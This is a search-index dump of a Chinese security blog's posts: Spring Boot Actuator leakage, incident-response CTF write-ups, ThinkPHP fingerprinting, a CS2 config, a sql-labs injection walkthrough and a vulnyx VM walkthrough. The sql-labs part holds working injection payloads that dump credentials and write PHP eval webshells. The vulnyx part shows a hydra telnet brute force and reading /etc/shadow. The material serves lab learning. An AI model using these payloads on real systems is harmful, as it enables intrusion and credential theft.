的堆转储。(通过分析查看/env端点被*号替换到数据的具体值。) GET /actuator/httptrace httptrace端点提供有关 HTTP 请求-响应交换的信息。（包括用户HTTP请求的Cookie数据，会造成Cookie泄露等） GET /actuator/info info端点提供有关应用程序的一般信息。 GET /actuator/integrationgraph integrationgraph端点公开了一个包含所有 Spring Integration 组件的图。 GET /actuator/liquibase liquibase端点提供有关 Liquibase 应用的数据库更改集的信息。 GET /actuator/logfile logfile端点提供对应用程序日志文件内容的访问。 GET /actuator/loggers loggers端点提供对应用程序记录器及其级别配置的访问。 GET /actuator/mappings mappings端点提供有关应用程序请求映射的信息。 GET /actuator/metrics metrics端点提供对应用程序指标的访问。 GET /actuator/prometheus 端点以prometheusPrometheus 服务器抓取所需的格式提供 Spring Boot 应用程序的指标。 GET /actuator/quartz quartz端点提供有关由 Quartz 调度程序管理的作业和触发器的信息。 GET /actuator/scheduledtasks scheduledtasks端点提供有关应用程序计划任务的信息。 GET /actuator/sessions sessions端点提供有关由 Spring Session 管理的应用程序 HTTP 会话的信息。 GET /actuator/startup startup端点提供有关应用程序启动顺序的信息。 POST /actuator/shutdown shutdown端点用于关闭应用程序。 0x03 漏洞利用 前面介绍过了Actuator一些基础后，现在来研究一下如果目标站点存在这个漏洞该如何利用。\n首先访问一下/actuator/env该文件目录，寻找一下敏感信息等等\n/actuator/heapdump文件可以直接下载下来。使用工具进行分析：\n工具下载地址：\n1 2 3 通过网盘分享的文件：JDumpSpider-1.1-SNAPSHOT-full.jar 链接: https://pan.baidu.com/s/1tL0gY9Xm4jBrXUxVj-g8og 提取码: pkb9 --来自百度网盘超级会员v4的分享 使用：\n1 java -jar JDumpSpider-1.1-SNAPSHOT-full.jar 绝地地址（heapdump） \u0026gt;\u0026gt;222.txt 这里直接泄露了Cookie信息。\n0x04 漏洞修复 1、屏蔽actuator路径\n1 2 3 location ~ .*actuator.* { deny all; } ","date":"2025-09-02T00:00:00Z","image":"http://localhost:1313/images/27.webp","permalink":"http://localhost:1313/p/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95spring-boot-actuator-%E6%95%8F%E6%84%9F%E4%BF%A1%E6%81%AF%E6%B3%84%E9%9C%B2-%E9%AB%98%E5%8D%B1/","title":"【渗透测试】Spring Boot Actuator 敏感信息泄露-高危"},{"content":"简介 服务器场景操作系统 Windows\n服务器账号密码 administrator xj@123456\n题目来源公众号 知攻善防实验室\nhttps://mp.weixin.qq.com/s/89IS3jPePjBHFKPXnGmKfA\n任务环境说明\n注：样本请勿在本地运行！！！样本请勿在本地运行！！！样本请勿在本地运行！！！\n应急响应工程师小王某人收到安全设备告警服务器被植入恶意文件，请上机排查\n开放题目\n漏洞修复\n参考\nhttps://mp.weixin.qq.com/s/1gebC1OkDgtz4k4YtN10dg\n靶机启动 过程 flag1 通过本地 PC RDP到服务器并且找到黑客植入 shell,将黑客植入 shell 的密码 作为 FLAG 提交;\n上传D盾,直接扫就行.\n打开文件,发现默认密码\nflag\n1 flag{rebeyond} flag2 通过本地 PC RDP到服务器并且分析黑客攻击成功的 IP 为多少,将黑客 IP 作为 FLAG 提交;\n查看apache.log文件,发现写入了webshell.php文件.\n1 log日志地址:C:\\phpstudy_pro\\Extensions\\Apache2.4.39\\logs flag:\n1 flag{192.168.126.1} flag3 通过本地 PC RDP到服务器并且分析黑客的隐藏账户名称,将黑客隐藏账户名称作为 FLAG 提交;\n直接使用工具,即可\nflag:\n1 flag{hacker138} flag4 通过本地 PC RDP到服务器并且分析黑客的挖矿程序的矿池域名,将黑客挖矿程序的矿池域名称作为(仅域名)FLAG 提交;\n找到hacker128用户的桌面,发现一个恶意的挖矿程序,然后进行反编译一下,得到flag\nflag\n1 flag{wakuang.zhigongshanfang.top} ","date":"2025-09-01T00:00:00Z","image":"http://localhost:1313/images/25.webp","permalink":"http://localhost:1313/p/%E7%8E%84%E6%9C%BA%E9%9D%B6%E5%9C%BA%E7%AC%AC%E5%9B%9B%E7%AB%A0-windows-%E5%AE%9E%E6%88%98-emlog/","title":"【玄机靶场】第四章 windows 实战-emlog"},{"content":"简介 第四章 windows实战-wordpress\nrdp 端口 3389\n账号：administrator\n密码：xj@123456\nflag1 请提交攻击者攻击成功的第一时间，格式：flag{YY:MM:DD hh:mm:ss}\n登录后台，获取后台地址：http://localhost:8080/manage/login.php\n在日志里筛选一下：\n1 grep \u0026#34;manage/login.php\u0026#34; access.log 可以看到302成功跳转：\n1 2 3 4 5 6 7 192.168.141.55 - - [29/Apr/2023:22:45:23 +0800] \u0026#34;POST /index.php/action/login?_=139102b0477b064f9cf570483837d74c HTTP/1.1\u0026#34; 302 5 \u0026#34;http:// 192.168.141.188/manage/login.php?referer=http%3A%2F%2F192.168.141.188%2Fmanage%2F\u0026#34; \u0026#34;Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) G ecko/20100101 Firefox/110.0\u0026#34; 192.168.141.55 - - [29/Apr/2023:22:45:23 +0800] \u0026#34;GET /manage/ HTTP/1.1\u0026#34; 302 5 \u0026#34;http://192.168.141.188/manage/login.php?referer=http%3A%2F %2F192.168.141.188%2Fmanage%2F\u0026#34; \u0026#34;Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko/20100101 Firefox/110.0\u0026#34; 192.168.141.55 - - [29/Apr/2023:22:45:23 +0800] \u0026#34;GET /manage/welcome.php HTTP/1.1\u0026#34; 200 10013 \u0026#34;http://192.168.141.188/manage/login.php?ref erer=http%3A%2F%2F192.168.141.188%2Fmanage%2F\u0026#34; \u0026#34;Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko/20100101 Firefox/110.0\u0026#34; flag\n1 flag{2023:04:29 22:45:23} flag2 请提交攻击者的浏览器版本 flag{Firgfox/2200}\n由flag1可知\nflag\n1 flag{Firefox/110.0} flag3 请提交攻击者目录扫描所使用的工具名称\n可以看出扫描器的特征：\n1 Fuzz Faster U Fool v1.5.0 flag\n1 flag{Fuzz Faster U Fool} flag4 找到攻击者写入的恶意后门文件，提交文件名（完整路径）\n查看日志：\n1 flag{C:\\phpstudy_pro\\WWW\\.x.php} flag5 找到攻击者隐藏在正常web应用代码中的恶意代码，提交该文件名（完整路径）\nD盾直接扫描即可：\n1 flag{C:\\phpstudy_pro\\WWW\\usr\\themes\\default\\post.php} flag6 请指出可疑进程采用的自动启动的方式，启动的脚本的名字 flag{1.exe}\n查看开机自动文件夹，并没有发现有什么恶意的东西。\n1 2 C:\\ProgramData\\Microsoft\\Windows\\Start Menu\\Programs\\StartUp C:\\Users\\Administrator\\AppData\\Roaming\\Microsoft\\Windows\\Start Menu\\Programs\\Startup 并无可疑文件，接下来查看 Temp 目录和 Windows 目录\n在 Windows 目录下，发现可疑文件\n在windows目录下，发现一个x.bat文件，发现这个bat文件是打开360.exe文件\nflag\n1 flag{x.bat} ","date":"2025-09-01T00:00:00Z","image":"http://localhost:1313/images/26.webp","permalink":"http://localhost:1313/p/%E7%8E%84%E6%9C%BA%E9%9D%B6%E5%9C%BA%E7%AC%AC%E5%9B%9B%E7%AB%A0-windows-%E5%AE%9E%E6%88%98-wordpress/","title":"【玄机靶场】第四章 windows 实战-wordpress"},{"content":"1. 前言 服务框架是指某领域一类服务的可复用设计与不完整的实现， 与软件框架不同的是， 服务框架同时体现着面向服务， 一个服务框架可以分为两个主要部分： 服务引擎、 引入的外部服务。 ThinkPHP， 是为了简化企业级应用开发和敏捷WEB应用开发而诞生的开源轻量级PHP框架。 可想而知框架连接着网络和系统接触着越来越多的关键数据， 渐渐成为单位公共安全中最具有战略性的资产， 框架的安全稳定运行也直接决定着业务系统能否正常使用。 如果框架被远程代码执行攻破， 这些信息一旦被篡改或者泄露， 轻则造成企业经济损失，重则影响企业形象，甚至行业、社会安全。可见，数据库安全至关重要。\nThinkPHP是一个快速、 兼容而且简单的轻量级国产PHP开发框架， 诞生于2006年初， 原名FCS， 2007年元旦正式更名为ThinkPHP， 遵循Apache2开源协议发布， 从Struts结构移植过来并做了改进和完善， 同时也借鉴了国外很多优秀的框架和模式， 使用面向对象的开发结构和MVC模式， 融合了Struts的思想和TagLib（ 标签库） 、 RoR的ORM映射和ActiveRecord模式。 ThinkPHP可在Windows和Linux等操作系统运行， 支持MySql， Sqlite\n和PostgreSQL等多种数据库以及PDO扩展， 是一款跨平台， 跨版本以及简单易用的PHP框架。\n2. 识别tp框架（指纹） 2.1 icon判断 /favicon.ico\n2.1 报错 2.3 错误传参 2.4 特殊指纹出现logo /?c=4e5e5d7364f443e28fbf0d3ae744a59a\n/4e5e5d7364f443e28fbf0d3ae744a59a\n/4e5e5d7364f443e28fbf0d3ae744a59a-index.html\n2.5 body特征 body里有\u0026quot;十年磨一剑\u0026quot; 或者\u0026quot;ThinkPHP\u0026quot;\n2.6 插件 ","date":"2025-08-31T00:00:00Z","image":"http://localhost:1313/images/22.webp","permalink":"http://localhost:1313/p/thinkphp%E8%AF%86%E5%88%ABtp%E6%A1%86%E6%9E%B6%E6%8C%87%E7%BA%B9-01/","title":"【Thinkphp】识别tp框架(指纹)-01"},{"content":"简介 题目来源公众号 vulntarget\nhttps://mp.weixin.qq.com/s/LHq8O2F-r6rbhVW84Q4KEg\n任务环境说明\nwindows账密：workstation admin@20221123\nweb端口外部无法访问，请RDP连接上机排查\nflag1 主站进入后台的文件名称？\n查看apache日志，找到\nflag\n1 flag{FNeSOgYGkp.php} flag2 黑客是从哪个端口上传木马文件的?\n打开小皮查看网页端口，7001打不开，所以为80\nflag\n1 flag{80} flag3 黑客添加的木马文件名称和密码分别是什么，将黑客添加 的木马名称和密码作为flag提交{fag(名称:密码)\n直接可以使用D盾扫出该文件。然后使用webshell检测一下，发现确实是webshell后门工具。\n1 flag{api3.php:Admin} flag4 可以根据日志查看：\n1 flag{192.168.112.123} ","date":"2025-08-31T00:00:00Z","image":"http://localhost:1313/images/24.webp","permalink":"http://localhost:1313/p/%E7%8E%84%E6%9C%BA%E9%9D%B6%E5%9C%BA%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94-vulntarget-j-01/","title":"【玄机靶场】应急响应-vulntarget-j-01"},{"content":"autoexec.cfg 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51 52 53 54 55 56 57 58 59 60 61 62 63 64 65 66 67 68 69 70 71 72 73 74 75 76 77 78 79 80 81 82 83 84 85 86 87 88 89 90 91 92 93 94 95 96 97 98 99 100 101 102 103 104 105 106 107 108 109 alias +pwaswitchknife slot3 alias -pwaswitchknife lastinv alias \u0026#34;refundall\u0026#34; \u0026#34;sellback 0;sellback 1;sellback 2;sellback 3;sellback 4;sellback 5;sellback 6;sellback 8;sellback 9;sellback 10;sellback 11;sellback 12;sellback 13;sellback 14;sellback 15;sellback 16;sellback 17;sellback 18;sellback 26;sellback 26;sellback 27;sellback 28;sellback 29;sellback 30;sellback 32;sellback 33;sellback 34;sellback 35;play ui\\panorama\\itemtile_click_02.vsnd_c\u0026#34; //-----------------------------HUD设置-------------------------------- //游戏HUD(0关闭,1开启) cl_drawhud \u0026#34;1\u0026#34;; //只显示击杀和准星(0关闭,1开启) cl_draw_only_deathnotices \u0026#34;0\u0026#34;; //HUD颜色(0队伍颜色,1白色,2亮白色,3淡蓝色,4蓝色,5紫色,6红色,7橙色,8黄色,9绿色,10浅绿色,11粉红色) cl_hud_color \u0026#34;11\u0026#34;; //一直显示装备栏(0关闭,1开启) cl_showloadout \u0026#34;1\u0026#34;; //游戏自动提示(0关闭,1开启) cl_autohelp \u0026#34;0\u0026#34;; //鼠标灵敏度 sensitivity 1.2 zoom_sensitivity_ratio_mouse 1.2 //-----------------------------准星设置-------------------------------- cl_crosshairalpha \u0026#34;200\u0026#34;; cl_crosshaircolor \u0026#34;1\u0026#34;;//颜色 cl_crosshairdot \u0026#34;0\u0026#34;; cl_crosshair_t \u0026#34;0\u0026#34;; cl_crosshairgap \u0026#34;-5\u0026#34;;//间距 cl_crosshairsize \u0026#34;1.29\u0026#34;;//长度 cl_crosshairstyle \u0026#34;4\u0026#34;; cl_crosshairthickness \u0026#34;-10.0\u0026#34;;//粗细 cl_crosshair_outlinethickness \u0026#34;0\u0026#34;; cl_crosshair_drawoutline \u0026#34;0\u0026#34;; //狙击准星粗细 cl_crosshair_sniper_width \u0026#34;0\u0026#34;; //狙击准星模糊(0关闭，1开启) cl_crosshair_sniper_show_normal_inaccuracy \u0026#34;0\u0026#34;; //准星警告(0关闭，1开启) cl_crosshair_friendly_warning \u0026#34;0\u0026#34;; //手臂视角类型(0自定义，1默认，2写实，3经典) viewmodel_presetpos \u0026#34;3\u0026#34;; //手臂左右位置(-2.25~2.25) viewmodel_offset_x \u0026#34;2.5\u0026#34;; //手臂前后位置(-2~2) viewmodel_offset_y \u0026#34;0\u0026#34;; //手臂上下位置(-2~2) viewmodel_offset_z \u0026#34;-1.5\u0026#34;; //手臂FOV(54~68) viewmodel_fov \u0026#34;68\u0026#34;; //新手臂摇晃动作(false关闭，true开启) cl_usenewbob false //-----------------------------鼠标按键设置-------------------------------- //鼠标左键 开火 bind \u0026#34;mouse1\u0026#34; \u0026#34;+attack\u0026#34;; //鼠标右键 第二开火 bind \u0026#34;mouse2\u0026#34; \u0026#34;+attack2\u0026#34;; //鼠标里侧键 使用麦克风 bind \u0026#34;mouse5\u0026#34; \u0026#34;+voicerecord\u0026#34;; //鼠标外侧键 切换左右持枪 bind \u0026#34;mouse4\u0026#34; \u0026#34;switchhands\u0026#34;; //鼠标下滚轮 跳跃 bind \u0026#34;mwheeldown\u0026#34; \u0026#34;+jump\u0026#34;; //-----------------------------雷达设置-------------------------------- //游戏雷达(0关闭,1开启) cl_drawhud_force_radar \u0026#34;1\u0026#34;; //雷达大小(0.8~1.3) cl_hud_radar_scale \u0026#34;1.3\u0026#34;; //雷达缩放(0.25~0.7) cl_radar_scale \u0026#34;0.35\u0026#34;; //雷达以玩家为中心(0关闭,1开启) cl_radar_always_centered \u0026#34;0\u0026#34;; //雷达旋转(0关闭,1开启) cl_radar_rotate \u0026#34;1\u0026#34;; //雷达人物大小(0.4~1) cl_radar_icon_scale_min \u0026#34;0.4\u0026#34;; //计分板雷达显示模式(0圆形,1方形) cl_radar_square_with_scoreboard \u0026#34;1\u0026#34;; //-----------------------------游戏帧数上限(0无上限)-------------------------------- fps_max \u0026#34;0\u0026#34;; //-----------------------------按键绑定-------------------------------- bind \u0026#34;downarrow\u0026#34; \u0026#34;buy rifle1;\u0026#34; bind \u0026#34;rightarrow\u0026#34; \u0026#34;buy rifle4;\u0026#34; bind \u0026#34;leftarrow\u0026#34; \u0026#34;buy vesthelm;buy vest;\u0026#34; bind \u0026#34;kp_3\u0026#34; \u0026#34;buy secondary4;\u0026#34; bind \u0026#34;kp_4\u0026#34; \u0026#34;buy smokegrenade;\u0026#34; bind \u0026#34;kp_5\u0026#34; \u0026#34;buy flashbang;\u0026#34; bind \u0026#34;kp_6\u0026#34; \u0026#34;buy molotov;buy incgrenade;\u0026#34; //-----------------------------滚轮跳设置-------------------------------- //下滚轮跳 bind \u0026#34;MWHEELDOWN\u0026#34; \u0026#34;+jump\u0026#34; bind \u0026#34;v\u0026#34; \u0026#34;+jump\u0026#34; bind \u0026#34;space\u0026#34; \u0026#34;+jump\u0026#34; lianxi.cfg 一些跑图的cfg文件：\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51 //开启作弊 sv_cheats true //去除开场动画 cl_versus_intro false mp_team_intro_time 0 //钱 无限时间 购买时间地点 mp_buy_anywhere 1 mp_buytime 99999 ammo_grenade_limit_total 5 mp_maxmoney 16000 mp_startmoney 16000 mp_roundtime 60 mp_roundtime_defuse 60 mp_roundtime_hostage 60 mp_freezetime 0 bot_stop 1 //无坠落道具伤害 能看到火烧效果 sv_falldamage_scale 0 sv_hegrenade_damage_multiplier 0 sv_regeneration_force_on true ff_damage_reduction_grenade_self 0 //飞行 bind alt noclip //加bot和踢bot bind = bot_add bind - bot_kick //放置bot bind o bot_place //重复上一个道具 bind i sv_rethrow_last_grenade //刷新游戏 bind l mp_restartgame 1 //切换子弹落点显示 bind p \u0026#34;toggle sv_showimpacts 0 1\u0026#34; //清除烟雾弹 bind k \u0026#34;ent_fire smokegrenade_projectile kill;ent_fire molotov_projectile kill;ent_fire flashbang_projectile kill;ent_fire hegrenade_projectile kill;ent_fire decoy_projectile kill;stopsound\u0026#34; //自动复活 mp_respawn_on_death_ct true mp_respawn_on_death_t true mp_restartgame 1 ","date":"2025-08-31T00:00:00Z","image":"http://localhost:1313/images/21.webp","permalink":"http://localhost:1313/p/%E6%B8%B8%E6%88%8Fcs2_cfg%E6%96%87%E4%BB%B6-%E4%B8%AA%E4%BA%BA%E4%BD%BF%E7%94%A8%E6%96%B9%E6%A1%88/","title":"【游戏】CS2_cfg文件-个人使用方案"},{"content":"Less-6 验证注入点：双引号报错，两个双引号闭合利用闭合方式：\u0026quot; \u0026lt;payload\u0026gt; --+\n就闭合方式和 Less-5 不一样外，其余都一样\n1.进入第六题，显示Please input the ID as parameter with numeric value，告诉了我们参数为id\n发现闭合方式为\u0026quot;，和上一关同理采用报错注入，这里用extractvalue函数\n1 http://localhost/sqli-labs/Less-6/?id=1\u0026#34; 1 ?id=1\u0026#34; and extractvalue(1,concat(0x7e,(select concat(username,\u0026#39;:\u0026#39;,password) from users limit 0,1)))--+ Less-7 验证注入点：单引号报错，两个单引号闭合利用闭合方式：')) \u0026lt;payload\u0026gt; --+\n1 http://localhost/sqli-labs/Less-7/?id=1 前置知识:\n文件读写注入条件：\n在配置文件中设置\nsecure_file_priv=\u0026rsquo;\u0026rsquo;\n1 2 3 注： 1. Windows的配置文件在mysql下的my.ini 2. Linux的配置文件在/etc/conf 查看是否配置成功：\n1 show global variables like \u0026#39;%secure%\u0026#39;; php的配置文件php.ini关闭魔术引号\nmagic_quotes_gpc = Off 知道服务器的绝对路径 登录的账户具有root权限\n读取文件：\nload_file() 1 例：select load_file(\u0026#34;D:/password.txt\u0026#34;) # 读取D盘下的password.txt文件 写文件：\ninto outfile 路径\n实战\n1.判断闭合方式闭合方式\n利用报错信息判断闭合方式为\u0026rsquo;))\n1 http://localhost/sqli-labs/Less-7/?id=1 \u0026#39;)) --+ 利用文件读写注入写入木马：\n写入一句话木马：\n1 2 3 4 正常Payload:\u0026lt;?php eval($_POST[\u0026#39;pwd\u0026#39;]);?\u0026gt; 十六进制：0x3c3f706870206576616c28245f504f53545b27707764275d293b3f3e http://localhost/sqli-labs/Less-7/?id=-1\u0026#39;)) UNION SELECT 1,2,0x3c3f706870206576616c28245f504f53545b27707764275d293b3f3e into outfile \u0026#39;C:\\\\phpstudy_pro\\\\WWW\\\\hack.php\u0026#39; --+ 连接地址：http://localhost/hack.php\n连接密码：pwd\nLess-8 \u0026lsquo;闭合 布尔盲注\n使用的注入语句和第五关的布尔盲注一样\n示例，判断长度：\n1 http://localhost/sqli-labs/Less-8/?id=1\u0026#39;and length((select database()))\u0026gt;7 --+ 写shell：\n1 http://localhost/sqli-labs/Less-8/?id=-1\u0026#39; UNION SELECT 1,2,0x3c3f706870206576616c28245f504f53545b27707764275d293b3f3e into outfile \u0026#39;C:\\\\phpstudy_pro\\\\WWW\\\\hack.php\u0026#39; --+ 链接成功。\nLess-9 基于GET单引号基于时间盲注\n如果当前数据库名字符长度大于1，则执行sleep函数使数据库执行延迟，否则则返回1。\n1 2 http://localhost/sqli-labs/Less-9/?id=1\u0026#39; and if(length(database())\u0026gt;1,sleep(5),1) --+ 延迟5秒 Less-10 基于GET双引号基于时间盲注\n与第9关差不多，只不过闭合方式变成双引号了\n1 2 http://localhost/sqli-labs/Less-10/?id=1\u0026#34; and if(length(database())\u0026gt;1,sleep(5),1) --+ 延迟5秒 Less-11 基于单引号的POST注入\n单引号测试：\n1 uname=admin\u0026#39; and 1=1 --+ \u0026amp;passwd=\u0026amp;submit=Submit 字段个数：\n1 2 3 uname=admin\u0026#39; order by 3 %23 \u0026amp;passwd=\u0026amp;submit=Submit //报错 uname=admin\u0026#39; order by 2 %23 \u0026amp;passwd=\u0026amp;submit=Submit //正常 说明有两个字段 查找回显位：\n1 uname=-admin\u0026#39; union select 1,2 %23 \u0026amp;passwd=\u0026amp;submit=Submit 爆库名：\n1 uname=-admin\u0026#39; union select 1,group_concat(table_name) from information_schema.tables where table_schema=database() %23 \u0026amp;passwd=\u0026amp;submit=Submit 爆表名：\n1 uname=-admin\u0026#39; union select 1,group_concat(table_name) from information_schema.tables where table_schema=database() %23 \u0026amp;passwd=\u0026amp;submit=Submit 爆列名：\n1 uname=-admin\u0026#39; union select 1,group_concat(column_name) from information_schema.columns where table_name=\u0026#39;emails\u0026#39; %23 \u0026amp;passwd=\u0026amp;submit=Submit 爆信息：\n1 uname=-admin\u0026#39; union select 1,group_concat(concat_ws(\u0026#39;-\u0026#39;,id,email_id)) from emails %23 \u0026amp;passwd=\u0026amp;submit=Submit 写shell：\n1 uname=-admin\u0026#39; UNION SELECT 1,\u0026#39;\u0026lt;?php @eval($_POST[\u0026#34;v\u0026#34;]);?\u0026gt;\u0026#39; into outfile \u0026#34;D:\\\\phpStudy_pro\\\\WWW\\\\hack1.php\u0026#34; %23 \u0026amp;passwd=\u0026amp;submit=Submit 成功连接\nLess-12 跟11关差不多，但是使用的是双引号加括号进行闭合。\n1 uname=admin\u0026#34;) order by 2 --+\u0026amp;passwd=\u0026amp;submit=Submit 然后后面跟11关一样。\nLess-13 基于单引号加括号进行闭合，错误回显注入。和十二关一样。\n构建payload:\n1 uname=admin\u0026#39;\u0026amp;passwd=pass\u0026amp;submit=Submit 1 从返回结果（sql语法问题）可见本关的闭合是\u0026#39;) 使用\n1 2 3 uname=admin\u0026#39;) order by 2 --+\u0026amp;passwd=pass\u0026amp;submit=Submit uname=admin\u0026#39;) order by 3 --+\u0026amp;passwd=pass\u0026amp;submit=Submit 进行测试，发现可知查询结果有两列 使用union进行查询，发现没有回显。\n1 uname=admin\u0026#39;) union select 1,2 --+\u0026amp;passwd=pass\u0026amp;submit=Submit 看来这关要用报错注入了\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 #获取服务器上所有数据库的名称 uname=ele\u0026#39;) and updatexml(1,concat(0x7e,substr((select group_concat(schema_name) from information_schema.schemata),1,31),0x7e),1)#\u0026amp;passwd=pass\u0026amp;submit=Submit uname=ele\u0026#39;) and updatexml(1,concat(0x7e,substr((select group_concat(schema_name) from information_schema.schemata),32,31),0x7e),1)#\u0026amp;passwd=pass\u0026amp;submit=Submit uname=ele\u0026#39;) and updatexml(1,concat(0x7e,substr((select group_concat(schema_name) from information_schema.schemata),63,31),0x7e),1)#\u0026amp;passwd=pass\u0026amp;submit=Submit #获取pikachu数据库的所有表名称 uname=ele\u0026#39;) and updatexml(1,concat(0x7e,substr((select group_concat(table_name) from information_schema.tables where table_schema=\u0026#39;pikachu\u0026#39;),1,31),0x7e),1)#\u0026amp;passwd=pass\u0026amp;submit=Submit uname=ele\u0026#39;) and updatexml(1,concat(0x7e,substr((select group_concat(table_name) from information_schema.tables where table_schema=\u0026#39;pikachu\u0026#39;),32,31),0x7e),1)#\u0026amp;passwd=pass\u0026amp;submit=Submit #获取pikachu数据库users表的所有列名称 uname=ele\u0026#39;) and updatexml(1,concat(0x7e,substr((select group_concat(column_name) from information_schema.columns where table_schema=\u0026#39;pikachu\u0026#39; and table_name=\u0026#39;users\u0026#39;),1,31),0x7e),1)#\u0026amp;passwd=pass\u0026amp;submit=Submit #获取pikachu数据库users表的username和password列的所有值 uname=ele\u0026#39;) and updatexml(1,concat(0x7e,substr((select group_concat(concat(username,\u0026#39;^\u0026#39;,password)) from pikachu.users),1,31),0x7e),1)#\u0026amp;passwd=pass\u0026amp;submit=Submit uname=ele\u0026#39;) and updatexml(1,concat(0x7e,substr((select group_concat(concat(username,\u0026#39;^\u0026#39;,password)) from pikachu.users),32,31),0x7e),1)#\u0026amp;passwd=pass\u0026amp;submit=Submit uname=ele\u0026#39;) and updatexml(1,concat(0x7e,substr((select group_concat(concat(username,\u0026#39;^\u0026#39;,password)) from pikachu.users),63,31),0x7e),1)#\u0026amp;passwd=pass\u0026amp;submit=Submit uname=ele\u0026#39;) and updatexml(1,concat(0x7e,substr((select group_concat(concat(username,\u0026#39;^\u0026#39;,password)) from pikachu.users),94,31),0x7e),1)#\u0026amp;passwd=pass\u0026amp;submit=Submit 写webshell的payload:\n1 uname=ele\u0026#39;) or 1=1 limit 0,1 into outfile \u0026#39;C:/less13.php\u0026#39; lines terminated by 0x3c3f7068702061737365727428245f504f53545b6c65737331335d293b3f3e#\u0026amp;passwd=pass\u0026amp;submit=Submit Less-14 这关回显sql语法错误，并且闭合是\u0026quot;\n测试\n1 uname=admin\u0026#34;\u0026amp;passwd=pass\u0026amp;submit=Submit 和上一关一样，这关如果sql查询有值也不显示，所以还是用报错注入，图就不截了，和上一关差不多，跨库爆数据的所有payload如下：\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 #获取服务器上所有数据库的名称 uname=ele\u0026#34; and updatexml(1,concat(0x7e,substr((select group_concat(schema_name) from information_schema.schemata),1,31),0x7e),1)#\u0026amp;passwd=pass\u0026amp;submit=Submit uname=ele\u0026#34; and updatexml(1,concat(0x7e,substr((select group_concat(schema_name) from information_schema.schemata),32,31),0x7e),1)#\u0026amp;passwd=pass\u0026amp;submit=Submit uname=ele\u0026#34; and updatexml(1,concat(0x7e,substr((select group_concat(schema_name) from information_schema.schemata),63,31),0x7e),1)#\u0026amp;passwd=pass\u0026amp;submit=Submit #获取pikachu数据库的所有表名称 uname=ele\u0026#34; and updatexml(1,concat(0x7e,substr((select group_concat(table_name) from information_schema.tables where table_schema=\u0026#39;pikachu\u0026#39;),1,31),0x7e),1)#\u0026amp;passwd=pass\u0026amp;submit=Submit uname=ele\u0026#34; and updatexml(1,concat(0x7e,substr((select group_concat(table_name) from information_schema.tables where table_schema=\u0026#39;pikachu\u0026#39;),32,31),0x7e),1)#\u0026amp;passwd=pass\u0026amp;submit=Submit #获取pikachu数据库users表的所有列名称 uname=ele\u0026#34; and updatexml(1,concat(0x7e,substr((select group_concat(column_name) from information_schema.columns where table_schema=\u0026#39;pikachu\u0026#39; and table_name=\u0026#39;users\u0026#39;),1,31),0x7e),1)#\u0026amp;passwd=pass\u0026amp;submit=Submit #获取pikachu数据库users表的username和password列的所有值 uname=ele\u0026#34; and updatexml(1,concat(0x7e,substr((select group_concat(concat(username,\u0026#39;^\u0026#39;,password)) from pikachu.users),1,31),0x7e),1)#\u0026amp;passwd=pass\u0026amp;submit=Submit uname=ele\u0026#34; and updatexml(1,concat(0x7e,substr((select group_concat(concat(username,\u0026#39;^\u0026#39;,password)) from pikachu.users),32,31),0x7e),1)#\u0026amp;passwd=pass\u0026amp;submit=Submit uname=ele\u0026#34; and updatexml(1,concat(0x7e,substr((select group_concat(concat(username,\u0026#39;^\u0026#39;,password)) from pikachu.users),63,31),0x7e),1)#\u0026amp;passwd=pass\u0026amp;submit=Submit uname=ele\u0026#34; and updatexml(1,concat(0x7e,substr((select group_concat(concat(username,\u0026#39;^\u0026#39;,password)) from pikachu.users),94,31),0x7e),1)#\u0026amp;passwd=pass\u0026amp;submit=Submit 写webshell的payload：\n1 uname=ele\u0026#34; or 1=1 limit 0,1 into outfile \u0026#39;C:/less14.php\u0026#39; lines terminated by 0x3C3F7068702061737365727428245F504F53545B6C65737331345D293B3F3E#\u0026amp;passwd=pass\u0026amp;submit=Submit 本关代码与上一关的区别也仅在于闭合不同了。\n","date":"2025-08-30T00:00:00Z","image":"http://localhost:1313/images/22.webp","permalink":"http://localhost:1313/p/%E9%9D%B6%E5%9C%BAsql-labs-less-6-14/","title":"【靶场】sql-labs-Less 6-14"},{"content":"简介 vulnyx是一个提供各种漏洞环境的靶场平台，大部分环境是做好的虚拟机镜像文件，镜像预先设计了多种漏洞，需要使用VMware或者VirtualBox运行。每个镜像会有破解的目标，挑战的目标是获取操作系统的root权限和查看flag。\n部署方法 官网：https://vulnyx.com/\n1.在官网搜索你想要的镜像,然后下载\n2.下载好后解压得到.ova的文件，右击选择VMware进行打开\n3.在弹出的框中，选择存放的位置，然后点击导入\n4.最后等待导入完成，然后启动该虚拟机就可以了\n部署成功\n步骤 信息收集 这里我就不收集了，IP地址获取到了，如果在实战情况下还是需要确认一下的，直接fscan扫一边看一下：\n1 2 ./fscan.exe 192.168.198.137 -nobr -np nmap 192.168.30.45 -A -O -p 1-65535 这边使用fscan和nmap都扫描了一边发现开放了三个端口：\n1 2 3 22/tcp open ssh 23/tcp open telnet 80/tcp open http 这里进行尝试连接一下ssh，发现给出了一个账户：b.taylor\n22端口是不能爆破的。登录了一下发现是拒绝的。那就只能爆破23端口了。\n使用hydra进行爆破\n1 2 3 字典下载地址：https://github.com/dw0rsec/rockyou.txt hydra -l b.taylor -P /root/Desktop/Tools/rockyou.txt telnet://192.168.198.137 -V -I 账号密码：b.taylor/rockyou\n使用telnet进行登录即可：\nuser 1 ZWRjOWY1YzU1YWY4NzUwNTAzM2EyMGRkNDE5MzEzNjQK shadow提权 发现这个用户附加了shadow组\n可以查看一下权限\n1 2 id cat /etc/shadow 1 2 b.taylor:$y$j9T$du9sW7McN8WfjLKPRheP7/$pyE/4IrgDjurpaNzpdyxj8PYcOYyDksyYPG2rxEBxm4:20135:0:99999:7::: 